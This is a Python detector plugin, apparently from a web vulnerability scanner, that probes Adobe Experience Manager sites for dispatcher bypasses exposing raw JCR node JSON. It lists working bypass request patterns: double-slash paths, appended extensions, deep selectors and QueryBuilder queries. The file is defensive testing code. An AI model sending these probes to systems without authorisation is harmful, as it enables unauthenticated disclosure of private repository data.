"""Adobe Experience Manager (AEM / AEMaaCS) dispatcher-bypass & JCR exposure detector.

Detects the well-known Apache Sling / JCR information-disclosure class where the
AEM *dispatcher* is supposed to block requests for raw repository content
(``/content/*`` served with a ``.json`` selector, ``.infinity.json``,
QueryBuilder, etc.) but the filter is defeated with simple path / selector
mutations so the underlying node JSON is served unauthenticated.

Classic dispatcher bypasses probed here:

* **double-slash prefix** ``//content/...`` — the dispatcher normalises its
  allow/deny filter against the single-slash path, but Sling still resolves the
  node, so the raw JSON is returned;
* **appended benign extension** ``.json`` -> ``.json.css`` / ``.json.html`` /
  ``.json.ico`` / ``.json.png`` — dispatcher rules that key off the trailing
  extension are bypassed while Sling honours the first ``.json`` selector;
* **selector padding** ``.1.json`` / ``.2.json`` / ``.-1.json`` /
  ``.infinity.json`` / ``.tidy.json`` / ``.children.json`` — deep / alternative
  serialisations that filters frequently forget to block;
* **QueryBuilder servlet** ``/bin/querybuilder.json`` — full repository search
  that leaks arbitrary node data when reachable.

A leak is confirmed when a *mutated* request returns a JCR node
(``jcr:primaryType`` / ``jcr:content`` markers) that the *canonical* single-slash
request does **not** — proving a dispatcher filter bypass rather than an
intentionally public endpoint. When the canonical ``.json`` itself already
serves the node, that is reported too (the dispatcher is not filtering JCR JSON
at all). All probes are read-only ``GET`` requests.

The detector is endpoint-agnostic: it only runs when the target looks like AEM
(fingerprint markers, ``/content/`` or ``/etc.clientlibs/`` references, or an
operator-supplied node path) so non-AEM sites incur no extra traffic.
"""

from __future__ import annotations

import re
from typing import List, Optional, Set, Tuple
from urllib.parse import urlparse, urlunparse

from ..models import Finding, ScanContext
from ..registry import DetectorPlugin
from ..request_engine import RequestEngine

# Curated AEM node roots that exist on virtually every AEM install and are the
# canonical dispatcher-filter targets. Probed in addition to any content paths
# discovered from the live site so a leak is caught even on a shallow crawl.
_DEFAULT_NODES: Tuple[str, ...] = (
    "/content",
    "/content/dam",
    "/etc",
    "/etc/designs",
    "/libs",
    "/apps",
    "/home",
    "/conf",
    "/var",
    "/bin",
)

# Selector / extension mutations applied to a node's ``.json`` endpoint, ordered
# by real-world success rate. Each maps a bare node path -> a candidate URL path.
_SELECTOR_MUTATIONS: Tuple[str, ...] = (
    ".json",            # canonical serialisation (also the exposure baseline)
    ".1.json",          # one level deep
    ".2.json",          # two levels deep
    ".infinity.json",   # full subtree
    ".tidy.json",       # pretty-printed
    ".tidy.-1.json",    # full subtree, tidy
    ".children.json",   # child listing
    ".json.css",        # benign-extension dispatcher bypass
    ".json.html",
    ".json.ico",
    ".json.png",
    ".json.1.json",     # double-selector bypass
)

# JCR markers that positively identify a raw repository node serialisation.
_JCR_MARKERS: Tuple[str, ...] = (
    '"jcr:primaryType"',
    '"jcr:content"',
    '"jcr:title"',
    '"sling:resourceType"',
    '"cq:template"',
)

# AEM presence markers found in HTML / headers.
_AEM_BODY_MARKERS: Tuple[str, ...] = (
    "/etc.clientlibs/",
    "/etc/designs/",
    "/content/dam/",
    "data-sly-",
    "cq:template",
    "granite.csrf",
)

# Extract absolute content-repository paths referenced by the served HTML.
_CONTENT_PATH_RE = re.compile(r"/content/[A-Za-z0-9_][A-Za-z0-9_\-./]*", re.I)

# Statuses that mean "the dispatcher blocked the canonical request" — a JCR leak
# via a mutation of one of these proves a genuine filter bypass.
_BLOCKED_STATUSES = frozenset({301, 302, 401, 403, 404})

MAX_NODES = 40
MAX_HTML_SEEDS = 4


class AEMDispatcherDetector(DetectorPlugin):
    """Detect AEM dispatcher bypass / unauthenticated JCR content exposure."""

    name = "aem"

    def run(self, context: ScanContext, engine: RequestEngine) -> List[Finding]:
        base = self._base_url(context.target_url)
        if not base:
            return []

        operator_nodes = self._normalise_nodes(getattr(context, "aem_content_paths", []) or [])

        # Fetch a little HTML to (a) confirm AEM and (b) mine real content paths.
        html_blobs, headers_blob = self._gather_html(context, engine, base)
        is_aem = (
            operator_nodes
            or self._looks_like_aem(context, html_blobs, headers_blob)
        )
        if not is_aem:
            return []

        discovered = self._extract_content_paths(html_blobs)
        nodes = self._dedupe(operator_nodes + discovered + list(_DEFAULT_NODES))

        cap = getattr(context, "aem_max_paths", 0) or MAX_NODES
        nodes = nodes[:cap]

        findings: List[Finding] = []
        seen_evidence: Set[str] = set()

        for node in nodes:
            finding = self._probe_node(base, node, engine, seen_evidence)
            if finding is not None:
                findings.append(finding)

        qb = self._probe_querybuilder(base, engine, seen_evidence)
        if qb is not None:
            findings.append(qb)

        return findings

    # -- presence / discovery -------------------------------------------------

    def _gather_html(
        self, context: ScanContext, engine: RequestEngine, base: str
    ) -> Tuple[List[str], str]:
        blobs: List[str] = []
        headers_blob = ""
        seeds: List[str] = [context.target_url or base]
        for url in context.crawl.urls:
            if len(seeds) >= MAX_HTML_SEEDS:
                break
            if url not in seeds and self._same_host(url, base):
                seeds.append(url)

        for url in seeds[:MAX_HTML_SEEDS]:
            resp = self._safe_get(engine, url)
            if resp is None:
                continue
            if not headers_blob:
                headers_blob = " ".join(f"{k}: {v}" for k, v in resp.headers.items())
            if resp.text:
                blobs.append(resp.text)
        return blobs, headers_blob

    def _looks_like_aem(
        self, context: ScanContext, html_blobs: List[str], headers_blob: str
    ) -> bool:
        for tech in context.technologies or []:
            if "experience manager" in tech.lower() or tech.lower() == "aem":
                return True
        haystack = (headers_blob + " " + " ".join(html_blobs)).lower()
        if not haystack.strip():
            return False
        return any(marker.lower() in haystack for marker in _AEM_BODY_MARKERS)

    def _extract_content_paths(self, html_blobs: List[str]) -> List[str]:
        nodes: List[str] = []
        for blob in html_blobs:
            for raw in _CONTENT_PATH_RE.findall(blob):
                node = self._strip_to_node(raw)
                if node:
                    nodes.append(node)
                    # Also probe the site root and its immediate parent, since
                    # deep component nodes share the same dispatcher filter.
                    segments = node.strip("/").split("/")
                    for depth in (2, 3):
                        if len(segments) >= depth:
                            nodes.append("/" + "/".join(segments[:depth]))
        return nodes

    @staticmethod
    def _strip_to_node(raw: str) -> Optional[str]:
        # Drop query fragments, selectors and extensions to get the bare node.
        path = raw.split("?", 1)[0].split("#", 1)[0]
        # Cut at a JCR content selector if present (e.g. .../jcr:content/...).
        last = path.rsplit("/", 1)[-1]
        if "." in last:
            path = path.rsplit("/", 1)[0] + "/" + last.split(".", 1)[0]
        path = path.rstrip("/")
        return path if path.startswith("/content/") or path == "/content" else None

    # -- probing --------------------------------------------------------------

    def _probe_node(
        self, base: str, node: str, engine: RequestEngine, seen: Set[str]
    ) -> Optional[Finding]:
        canonical_url = base + node + ".json"
        canonical = self._safe_get(engine, canonical_url)
        canonical_status = canonical.status_code if canonical is not None else 0
        canonical_leaks = canonical is not None and self._is_jcr(canonical)

        if canonical_leaks:
            key = f"canon:{node}"
            if key in seen:
                return None
            seen.add(key)
            return self._make_finding(
                url=canonical_url,
                node=node,
                bypass="canonical .json selector (no dispatcher filter)",
                canonical_status=canonical_status,
                leak_status=canonical_status,
                body=canonical.text,
                confidence="high",
            )

        # Canonical is blocked/non-JCR: try dispatcher-bypass mutations.
        for mutation in _SELECTOR_MUTATIONS:
            if mutation == ".json":
                continue  # already covered by canonical
            for test_url, resp, label in self._mutation_responses(base, node, mutation, engine):
                if resp is None or not self._is_jcr(resp):
                    continue
                # Only a real bypass if canonical did not already serve it.
                key = f"bypass:{node}:{mutation}"
                if key in seen:
                    return None
                seen.add(key)
                confidence = "high" if canonical_status in _BLOCKED_STATUSES else "medium"
                return self._make_finding(
                    url=test_url,
                    node=node,
                    bypass=label,
                    canonical_status=canonical_status,
                    leak_status=resp.status_code,
                    body=resp.text,
                    confidence=confidence,
                )
        return None

    def _mutation_responses(self, base: str, node: str, mutation: str, engine: RequestEngine):
        """Yield (url, response, label) for each bypass variant of a mutation.

        The double-slash variant is sent through :meth:`RequestEngine.get_raw_path`
        because ``requests``/``urllib3`` collapse a literal leading ``//`` to a
        single ``/`` on the wire, which would silently neutralise the probe.
        """
        # 1) Selector/extension mutation on the normal single-slash path.
        single_url = base + node + mutation
        yield single_url, self._safe_get(engine, single_url), f"selector mutation '{mutation}'"
        # 2) Double-slash dispatcher bypass (raw target preserves the '//').
        raw_target = "/" + node + mutation  # node keeps its leading '/', so '//content...'
        double_url = base + raw_target
        yield double_url, self._safe_get_raw(engine, base, raw_target), \
            f"double-slash bypass '{raw_target}'"

    def _probe_querybuilder(
        self, base: str, engine: RequestEngine, seen: Set[str]
    ) -> Optional[Finding]:
        query = "/bin/querybuilder.json?path=/content&p.limit=5&p.hits=full"
        candidates = [
            (base + query, self._safe_get(engine, base + query), "QueryBuilder servlet exposed"),
            (base + "/" + query, self._safe_get_raw(engine, base, "/" + query),
             "QueryBuilder via double-slash bypass"),
        ]
        for candidate, resp, label in candidates:
            if resp is None:
                continue
            body = resp.text or ""
            if resp.status_code == 200 and '"hits"' in body and '"results"' in body:
                if "querybuilder" in seen:
                    return None
                seen.add("querybuilder")
                return Finding(
                    vulnerability="AEM QueryBuilder Content Enumeration",
                    severity="high",
                    cwe="CWE-200",
                    owasp="A01:2021 Broken Access Control",
                    url=candidate,
                    parameter="path",
                    description=(
                        f"The Adobe Experience Manager QueryBuilder servlet is reachable "
                        f"unauthenticated ({label}). It returns arbitrary repository nodes "
                        f"under /content, allowing enumeration and disclosure of internal "
                        f"JCR data. The dispatcher should block /bin/querybuilder.json."
                    ),
                    evidence=self._snippet(body),
                    detector=self.name,
                    confidence="high",
                    references=[
                        "https://helpx.adobe.com/experience-manager/dispatcher/using/dispatcher-configuration.html",
                        "https://cure53.de/pentest-report_aem.pdf",
                    ],
                )
        return None

    # -- helpers --------------------------------------------------------------

    def _make_finding(
        self,
        url: str,
        node: str,
        bypass: str,
        canonical_status: int,
        leak_status: int,
        body: str,
        confidence: str,
    ) -> Finding:
        return Finding(
            vulnerability="AEM Dispatcher Bypass — Unauthenticated JCR Content Disclosure",
            severity="high",
            cwe="CWE-200",
            owasp="A01:2021 Broken Access Control",
            url=url,
            parameter=None,
            description=(
                f"Adobe Experience Manager served a raw JCR content node for '{node}' "
                f"without authentication via {bypass}. The canonical request "
                f"'{node}.json' returned HTTP {canonical_status or 'error'} while the "
                f"mutated request returned HTTP {leak_status} with JCR JSON, indicating "
                f"the dispatcher content filter was bypassed. Exposed nodes can leak "
                f"internal properties, PII, email/phone directories, and other "
                f"repository data. Harden the dispatcher filter to deny '/content' "
                f"JSON/selector variants and normalise duplicate slashes."
            ),
            evidence=self._snippet(body),
            detector=self.name,
            confidence=confidence,
            references=[
                "https://helpx.adobe.com/experience-manager/dispatcher/using/dispatcher-configuration.html",
                "https://owasp.org/www-project-web-security-testing-guide/",
            ],
        )

    @staticmethod
    def _is_jcr(response) -> bool:
        ctype = (response.headers.get("Content-Type") or "").lower()
        body = response.text or ""
        if response.status_code != 200:
            return False
        looks_json = "json" in ctype or body.lstrip()[:1] in ("{", "[")
        if not looks_json:
            return False
        return any(marker in body for marker in _JCR_MARKERS)

    @staticmethod
    def _snippet(body: str, limit: int = 300) -> str:
        return " ".join((body or "").split())[:limit]

    @staticmethod
    def _base_url(target_url: str) -> str:
        if not target_url:
            return ""
        parsed = urlparse(target_url)
        if not parsed.scheme or not parsed.netloc:
            return ""
        return urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))

    @staticmethod
    def _same_host(url: str, base: str) -> bool:
        return urlparse(url).netloc == urlparse(base).netloc

    def _normalise_nodes(self, paths: List[str]) -> List[str]:
        out: List[str] = []
        for p in paths:
            p = (p or "").strip()
            if not p:
                continue
            if not p.startswith("/"):
                p = "/" + p
            # Strip a trailing .json/.selector the operator may have pasted.
            last = p.rsplit("/", 1)[-1]
            if "." in last and not p.endswith("/"):
                p = p.rsplit("/", 1)[0] + "/" + last.split(".", 1)[0]
            out.append(p.rstrip("/"))
        return out

    @staticmethod
    def _dedupe(nodes: List[str]) -> List[str]:
        seen: Set[str] = set()
        ordered: List[str] = []
        for n in nodes:
            if n and n not in seen:
                seen.add(n)
                ordered.append(n)
        return ordered

    def _safe_get(self, engine: RequestEngine, url: str):
        try:
            return engine.get(url)
        except Exception:
            return None

    def _safe_get_raw(self, engine: RequestEngine, base: str, raw_target: str):
        try:
            return engine.get_raw_path(base, raw_target)
        except Exception:
            return None
